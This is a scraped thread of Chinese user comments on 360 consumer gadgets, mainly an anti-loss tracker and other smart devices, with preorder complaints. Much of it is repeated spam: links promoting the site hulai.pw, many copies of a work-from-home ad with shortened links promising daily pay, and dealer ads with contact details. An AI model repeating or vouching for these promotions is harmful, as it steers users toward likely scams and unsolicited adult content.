家里用的全是360产品哦。 这个弄出来的太贴心了，给粗心大意的人最好的礼物呀！顶
好喜欢啊，那么能干而且感觉好可爱！！
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
希望能成功的申请到***，给小宝贝使用
多少钱啊        ~~~
我要我要~！对于我们这种迷糊的人呢简直是必备产品~！
赶紧的吧，米粉们急切期待你们造汽车，全电的那种，又便宜又实用
期待360出更多实用性强的科技产品。
跟360防丢卫士差不多功能，不知道哪个好一点
好东西啊哈哈，有没有在《窃听风云》里面的赶脚。。。
好东西，不错哟以后会越来越强大
手机、钱包、钥匙我都丢过 很多次差点丢了  非常期待360防丢卫士！
360一直很360度全方位的给力啊~~~~~~！！
这么神奇，如果真的做出来了，再也不怕丢东西。好期待哦！
好啊！快点实现啊！！！
想法是挺好的，但要考虑多方面因素就不知道怎样了
这个申请有几率得到吗，还是内部认领了？
智能家居时代的必备品，期待中
看介绍不错，想使用下。
黑客没空黑你
办公一族、学生都需要这个，很期待！！
说得好，扣走了太可惜
价格不菲啊，有点儿
手机丢了怎么办wwwww
真有就好了，就怕太贵，穷人还是要手洗
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
希望能申请成功
好想要啊，我米米只有50了 
这东西 防雷吗？ 打雷期间 这个gps 不危险吗？
健忘者的福利，也是我的福利，快来吧！
很实用的东东，特别是对我这种健忘的人！
不期待这个。。不实用。就算科技含量再高，对大众不实用的产品都是渣渣。
作为装饰作用不大，倒显累赘，科技产品先进，但功能无用无脑。
这种东西前途无量 就看价格了
支持360，不支持高清摄像机厂家，我踩高清摄像机厂家，我顶360
好东西，不知道贵不贵
希望加上一个LED小灯. 
力顶360，支持360，360万岁~\(≧▽≦)/~
想买一个啊。。。。。。
对这个产品挺感兴趣的，真想买来使用，不知道价格是多少的！
so easy!妈妈再也不担心我的钱包。
360挺好的，这个家庭卫士也满足了人们的需要。
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
一直很健忘，从未被超越
Android在可以用
电纸屏可以设计成保护壳一般，加装后手机将变成双面的。正面手机屏，背面电纸屏可以自由切换！ 这样即能满足阅读者需求，保护眼睛。亦减少电力消耗，延长待机时间。 为什么鱼和熊掌就不能兼得呢？
加油 加油 希望申请成功
Android在可以用
很酷,期待早日实现
对我这种健忘的人 真的很需要这个小帮手 希望申请能成功 
真的很希望使用，现在紧张生活，这个东西好用。价格希望定位不要太高。
真心感觉360现在越来越强大了
这个产品有线上买吗？如果申请不到的话还可以买一个哈
情侣版应该加一点特色功能啊。。
能接电话那就好 
这么神奇，如果真的做出来了，再也不怕丢东西。好期待哦！ 希望能申请成功 。
真希望能抽到我试用，永远支持360.360是真心的为客户着想啊。
等9月份的移动4G版本。、、
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
全天候的监控自己的运动、睡眠、心率等健康指标是很重要的，希望能测准。
手环靓丽。。性价比也高~这个果然很赞~作为米粉和酷客，看到奇酷网站上出现小米的产品，还是相当令人兴奋的事情~~除了赞我还能说点什么呢？希望奇酷和小米合作，给大家几个体验机会，哈哈！祝奇酷和小米都原来越好~~赞赞赞！
真的很漂亮.想来一个
从此你的头再也太不起来了，要一直盯着桌面
酷酷威电动独轮车智能思维车招代理商喽 零风险好项目  QQ892763652   全国免费加盟热线4000588195      www.cocowheel.com
我掐指一算，哈哈哈
期待申请成功！
不能浪费我们的宝贵时间，申请了就一定要给
使用起来会不会很麻烦
很喜欢，早点出！
期待您的到来，我一直要发明的物件，可惜人微言轻力量薄，最终被耽搁了，360你很给力！
酷酷电动思维平衡智能车诚招代理商  零风险代投入的好项目  全国加盟热线  400 0588 http://www.cocowheel.com
酷酷电动思维平衡智能车诚招代理商 零风险代投入的好项目 全国加盟热线 4000588195 http://www.cocowheel.com  
这个可以有 但是希望能便宜一点啊 最好是能大家接受
大学里，丢过无数次的U盘、手机、伞……
抄袭哆啦a梦= =╮(￣▽￣&quot;)╭  
只希望能做到真正的实用
说得对 她太夸大了
说得对 她太夸大了
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
高大上！！
这么神奇！如果真的做出来了，再也不怕丢东西。好期待哦！ 希望能申请成功 。 
最近较忙，慢慢来，会尽快上文字部分的。
专业打酱油。
文字部分今晚放出部分吧，最近太忙。
极易被损坏，触屏坏了怎么办？换一块会花高昂的价格。。。。。。。。。。。。能实用吗？
如果有了这血压仪就可以随时监测自己的血压了，实用
希望可以申请成功，非常感兴趣
那么多人申请呢 再说谁知道会不会有几个内部人员来凑热闹
期待360的硬件表现
我也好想要呀，什么时候有卖或者再次试用呀？
无敌了，这是要破天荒的节奏么
超给力的设计！在家坐观天下~
妈妈再也不用担心我和别人去看电影了，在家就可以看了，SO easy!   
虽然不抱很大的期望，但是还是希望没有内部黑幕，给我来个吧。
严重同意，不过还是很期待这种只有在高科技电影里才会出现的东西
根据上述信息，已经让我很期待了！
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
这款高清监控摄像头可以用手机照顾家里老人和小孩学习，自己可以安心工作不用担心家里了。神器
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
最为颈椎病患者，急需该产品。
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
从小到大丢了无数东西，钥匙已经丢了几天了还没找到，银行卡也丢了，好纠结啊！从小到大都希望我要是喊一声，东西能自己跑回来就好了。请一定要给我啊，不能再这么丢下去了。
希望  成功 
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不错！做工精细
米4-迷死
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
老子都还吧苹果时间给丢了呢，不过找回来了。。。。
为什么没有你们的联系方式，我要代理你们的产品！2242122587@qq.com  请联系我！
这款高清监控摄像头可以用手机照顾家里老人和小孩学习，自己可以安心工作不用担心家里了。神器 
这样就彻底进入了无纸化，无办公文 具化作业了。太过依赖科技，总归不是好事。懒人也只能适当的懒，如果懒到极致，只有懒死一条道了！
擦。。镶金镶钻。。当年的东西！！杠杠的B格。。！！
为什么没有联系方式，我要代理你们的产品。请联系我2242122587@qq.com 
为什么没有联系方式，我要代理你们的产品。请联系我2242122587@qq.com
～～ 不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
我在想，像我这样粗心鬼，洒水了。 像我上司那样动不动拍桌子。。。适用么？哈哈。
希望做得更可爱一点！
 一直想要一个这种智能手环
顶顶顶顶顶顶顶顶！我爱360.支持360.360产品最最好！！！！！！！
“警报警报，现在你已触动智通办公桌的防卫系统，在倒数十秒之后进入关机状态，估计我淡定的上司，也会慌张了。。。。”
这个太未来了~~
～～ 不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
感觉好高大上的样子！
什么抢购？从头到尾就显示无货，刷新也没有用，预订也是白搭，建议360是否对无货地区显示预订失败或不可预订以免浪费大家的时间和精力。
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
好酷，不过造型可以不要像保十洁的钥匙吗~~
不靠水的孩 子很无奈。。。能不能陆空啊
女朋友丢三落四的，这个产品以后完善了可以买给她~
这个好酷，kindle会不会有鸭梨哇~~
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的  
～～ 不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
超棒的设计 大爱是必需的
不错我喜欢
好不好，用过才知道。用得好。我为你代言哦！
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
最好设计一款像超市那样防盗的磁条状的 可以粘贴在物品任何隐秘的位置，不被发现，不被取下，又有防盗功能，就完美了 
你好 你们有QQ或者电话等联系方式吗？
很实用的东西
我经常掉手机，1个月就掉了2次，我希望这个产品能够帮助我
这是诺基亚（929,930）的外观还是苹果的外观，无法形容
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
内存是硬伤啊，最大才1g，这么限量的高端品，存储空间最少没个64g实在没意思啊，即使是十年前的产品，复刻也行，更换硬件也行啊
预约？什么叫预约，就是如果预约到了，就这些预约到的有权利购买此商品。既然要说预约，为什么所有人都能买。而且什么60秒就抢光了，你们这样，如果有几个人直接每人买10000个人，30000个三人包了。再跑去卖。得赚多少钱？ 还搞这个活动有什么用？你们直接卖给别人得了。。。 
我昨天好不容易等到10点，我使劲刷新页面。那里就直接显示无货？什么意思
上千？白金外壳，天然钻石镶嵌，蓝宝石屏幕，再加上限量二字，估计起码的十万起步吧
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
希望能送我一个使用
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
这么好的怀表，有纪念价值
擦。。还以为是可以投影到墙上可以看电影呢，无爱
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～  
很好很实用的东东
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
从小到大丢了无数东西，钥匙已经丢了几天了还没找到，银行卡也丢了，好纠结啊！从小到大都希望我要是喊一声，东西能自己跑回来就好了。请一定要给我啊，不能再这么丢下去了。
这是要怀旧的节奏
～～ 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
太感兴趣了 
确实比较安全便携，多少钱啊？
其实这样挺好，数据保存是个问题
啥时候有呢
照片咋看不了
而且，估计扣走的可能性相当的大啊！
摩托车可以适用么？或者电动车
赞一个 这个喜欢
最期待的还是这个产品
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
不！可！能！有！本！事！你！试！试！小！米！
价格是问题 有类似产品 就是不知道兼容问题
不可能，你试试就知道事实了
takee 就是类似手机？
APP可以集成啊 不需要一个硬件啊
～ 不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）
～ 不限制工作时间， 做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
很想有一个
如果手机找不到了怎么办。。。。。
http://bbs.360safe.com/forum.php?mod=viewthread&amp;tid=4413591&amp;extra=page%3D1%26filter%3Ddateline%26orderby%3Dlastpost%26dateline%3D86400%26dateline%3D86400%26orderby%3Dlastpost
身份证丢过两次，银行卡丢过五六次，人也走丢过一次........
好东西，应该很受欢迎！！！
看这个哈，抢购攻略，预约机制确实有问题。我用的那个联系叮咚的方案，提前加入购入车，填好单，直接刷新提交
不错 感兴趣
这个东西功能齐全，外观不像金属的上档次，在接打电话时能否解决接听方便音量清晰，动作协调的问题，最后就是质量一定要敢比拼苹果，三星。盼中国民族好产品，严把质量关！
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
不错 期待 
应该很贵吧！
我喜欢。好久上市
好久上市啊
真心不错！！！！！期待ing
听介绍很适合我这些经常找不到东西的人使用，希望申请批准，帮我一个大忙。
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
希望得到。
手机的大部分APP都不准
肯定价格不费
这最少也要十几万吧
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
经过计算，1000个人中只有6.818182个人可能被选中（360/52800），是不是有点少
这么高端五十万能买下来吗
～ 不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）
梓卜语 ‘感觉写报告的是一个色鬼！！！！！！！！还胴体呢！！哀家是皇后的尊称！！！没文化！！！’ 哈哈哈好喜欢这个犀利妹啊，评论的真好，入木三分，赞、赞、赞！！！
关键只是支持安卓系统。 
为啥不是支持4G呢？       
最少也要56千吧 
我带个U盘只有百分之二十能带回来，不知道就随手放哪里了，手机也丢了至少5台了，还没算找回来的3台……
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
你好！我愿意支持你们但是必须满足我们的要求。产品 130 万像素太低了，强烈的希望增加到 500 w, 还要加上电子陀螺仪，我可不想风一吹就跑了。要有了这些功能你就强悍了，支持你的人也会更多。强烈的要求增加 500 w 和 电子陀螺仪。如果没有我想我对它的想法不大。那样就需要了。
你好！我愿意支持你们但是必须满足我们的要求。产品 130 万像素太低了，强烈的希望增加到 500 w, 还要加上电子陀螺仪，我可不想风一吹就跑了。要有了这些功能你就强悍了，支持你的人也会更多。强烈的要求增加 500 w 和 电子陀螺仪。如果没有我想我对它的想法不大。那样就需要了。
好想要，我掉过好多东西，上次iphone4s被偷了。。。。。浪费了4999元，求360送一个！！！
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
看起来真的是很不错，来申请个试用，希望通过
～ 不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族 都可以）
哪有啊 我想也就几万吧！
什么时候可以试用？ 好期待呀。 
哪儿有卖啊
1.待机时间问题，最少要7天以上吧，2.防水功能要特别加强我想这个不是很难吧。3.隐蔽性和造型多样化。4.佩戴方式要充满想象，可不可以是项链吊坠？腰带扣？不显示时间也可以吧，最重要的是实现定位，录音和其他监测功能，这样的话可以取消屏幕这样就不显眼了，女孩子佩戴的话可以是蝴蝶结发卡，绑头发的装饰品，项链装饰品等等也可以是鞋子上的装饰品，或者腰带扣等等隐蔽的地方
已申请，请审核，好用的话多多介绍朋友买~~~
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
真心想问下，什么时候可以买啊？ 我都等半年了。同事说，你怎么还没买哦。我只能默默地看着他说，没有地方买....
www.yunshuowang.cn
看起来还不错 
非常实用的东东
我从小到大没有没丢过东西的！
～ 不限制工作时间，做的越多 挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族 都可以） 
ios更新啦
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
www.xinyuanzhangui.com
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的  
～～～～～～～～ 不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）
--------------不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
很适合我这些经常找不到东西的人使用，希望可以申请成功，非常感谢！ 
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
实用，值得推荐
在上面一边吃火锅一边看视频
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
灰常喜欢。。。只希望价格不要那么贵啦~~~~~~~~~··
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
经常找不到东西啊。。。希望能抽一个 用得好就再买几个
有了它，家长就不用担心我的坐姿啦
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
呵呵，这不是科幻电影里经常出现的情景吗？这个应该算不上太难吧？现在的电视都可以做到118寸了，118寸做平的话应该够一个小桌子了，只是118寸的电视太贵了，一般人买不起，所以，这东西，要想一般人可以消费的起，最少也要等118寸的电视普及以后了！
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的  
红米可以用不，这个想知道，
～ -------不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）
～ -------不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
～ -------不限制工作时间，做的 越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
呵呵，N多年以前就是只能显示黑白两色，这么多年过去了，还是这样，没有一点变化！
～ -------不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
27.新问题：现在不知道能不能把手机上的造作投射到电脑屏幕。也就是我们在看电视、玩游戏、看照片将我们在手机屏幕投射到电脑屏幕，来放大观看。 
～ -------不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
～ -------不限制工作时间，做的 越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
～ -------不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
这个设计只是这一个球是做不到了，需要配套的温控系统和设备！必须连接暖气，空调等设备，如果只是做成一个智能家居的中央温控中心的话，难度不大！
要是能给手机充电的话，哪要骑多久才够啊！
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
喜欢是喜欢，可就是怕价钱…… 
～ -------不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
我一直就觉得360太好了 
支持，科技改变生活！
～ -------不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
～ -----------不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）
戴着去上学会不会被老师赶出来？ 而且上学不让带手机呀
～ -----------不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
～ -----------不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（ 宝妈、学生、上班族都可以） 
～ -----------不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
我经常丢三落四希望能抽到个这个 支持 360
～ -----------不限制工作时间，做的越多挣的越多～【 http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
我来个试试效果 
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
有了这个不等于有了个随时随地的网络机顶盒啦  赞一个 这个喜欢 
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
同感~~~~~~~~~~~~~~~~
不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
～---------- 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）
～---------- 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以） 
拉出去斩了
支持360   一定要给我啊 
很久以前就一直很期待有这样的一个发明的出现，期待有好的用户体验。
～---------- 不限制工作时间，做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
～---------- 不限制工作时间， 做的越多挣的越多～【dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）  
体贴的想法付诸于实践，广大健忘人群的福利小偷的克星，有广阔的市场前景
希望360的产品能越做越好  ！！！         也希望 更多的服务来完善我们的电脑 让我们的电脑更给力 更有活力！
希望360的产品能越做越好 ！！！
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
为什么不做成手环呢，这样不是更方便携带吗？
手机买过4个，丢了2个，还给同学丢过一个。。另外我是第一次参与这个活动，请360一定给我一个啊。
如果寻找之后，人在门外，声音在门内，怎么办。
 不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
 不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
 不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）～～～～～～～～～～【 http://t.cn/RPyMAKa 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
如果360和腾讯联合 那就是神奇 真心祝愿360更好
工作太忙，有了这个是不是可以让家庭更温馨一点。自由畅聊。
智能化生活的开始，希望能够体验到。
感觉被选到会好难的样子-------
360出的东西都特别棒，比如随身WIFI，我有一个超级好用，还可以当做U盘；希望这次的360防丢卫士有更好的性能！！
小米的 明年或许能出来 这是赤裸裸的打广告
 男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
～---------- 不限制工作时间，做的越多挣的越多～【http://dwz.cn/gkvFd】复制浏览器打开 ～ ～每夭5o~15o，我详细作讲解～ ～（宝妈、学生、上班族都可以）
